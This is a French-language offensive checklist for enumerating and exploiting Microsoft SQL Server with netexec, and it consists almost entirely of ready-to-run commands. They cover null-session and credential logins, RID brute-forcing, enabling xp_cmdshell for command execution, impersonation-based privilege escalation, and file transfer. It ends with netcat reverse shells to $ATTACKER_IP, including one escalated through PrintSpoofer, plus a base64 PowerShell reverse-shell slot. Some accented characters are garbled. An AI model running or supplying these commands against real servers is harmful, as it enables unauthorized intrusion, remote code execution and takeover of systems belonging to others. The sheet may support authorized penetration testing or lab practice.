# **MSSQL Enumeration & Exploitation Checklist**  

## ðŸ” EnumÃ©ration & Connexion  
```bash
# Tester l'accÃ¨s (y compris en null session)
netexec mssql $IP -u '' -p ''
netexec mssql $IP -u '$DOMAIN\$USER' -p '$PASSWORD'

# DÃ©couvrir les utilisateurs via RID bruteforce
nxc mssql $IP -u $USER -p '$PASSWORD' --rid-brute

# Lister les bases de donnÃ©es
netexec mssql $IP -u '$DOMAIN\$USER' -p '$PASSWORD' -q "SELECT name FROM sys.databases"
```

## ðŸ”“ PrivilÃ¨ges & ExÃ©cution de commandes  
```bash
# Activer xp_cmdshell
netexec mssql $IP -u '$DOMAIN\$USER' -p '$PASSWORD' --enable-xp-cmdshell

# ExÃ©cuter une commande via xp_cmdshell
netexec mssql $IP -u '$DOMAIN\$USER' -p '$PASSWORD' -x "whoami /all"

# VÃ©rifier les Ã©lÃ©vations de privilÃ¨ges possibles
netexec mssql $IP -u $USER -p '$PASSWORD' -M mssql_priv

# VÃ©rifier les permissions d'usurpation d'identitÃ© (impersonation)
netexec mssql $IP -u $USER -p '$PASSWORD' -M mssql_priv -o ACTION=privesc
```

## ðŸ“‚ Transfert de fichiers  
```bash
# Envoyer un fichier vers la cible
nxc mssql $IP -u $USER -p '$PASSWORD' --put-file /tmp/local_file C:\\Windows\\Temp\\remote_file.txt

# TÃ©lÃ©charger un fichier depuis la cible
nxc mssql $IP -u $USER -p '$PASSWORD' --get-file C:\\Windows\\Temp\\remote_file.txt /tmp/local_file
```

## ðŸš€ Reverse Shell  
```bash
# DÃ©poser netcat sur la cible
nxc mssql $IP -u $USER -p '$PASSWORD' --put-file nc.exe

# Lancer un reverse shell via netcat
nxc mssql $IP -u $USER -p '$PASSWORD' -x "C:\Windows\Temp\nc.exe $ATTACKER_IP 1234 -e cmd"

# Si whoami montre un token d'impersonation -> exploit PrintSpoofer
nxc mssql $IP -u $USER -p '$PASSWORD' -x 'C:\Windows\Temp\PrintSpoofer64.exe -c "C:\Windows\Temp\nc.exe $ATTACKER_IP 1234 -e cmd"'

# Reverse Shell sur Active Directory (Base64 PowerShell)
nxc mssql $IP -u '' -p '' -x '<PAYLOAD REVERSE SHELL BASE64 HERE>'
```